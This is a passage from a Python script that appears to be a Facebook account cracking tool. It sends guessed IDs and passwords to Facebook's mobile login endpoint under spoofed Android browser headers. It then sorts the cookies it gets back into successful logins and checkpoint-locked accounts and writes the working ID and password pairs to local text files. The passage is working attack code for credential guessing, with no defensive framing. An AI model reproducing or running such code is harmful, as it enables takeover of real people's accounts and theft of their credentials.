    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://x.facebook.com//login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[151:166]
                print('\033[1;32m[MICKY-OK] '+uid+'|'+ps+'\033[0;97m')
                open('MICKY-OK.txt', 'a').write(uid+' | '+ps+ '\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[MICKY-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('MICKY-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mMICKY \033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass

usman()
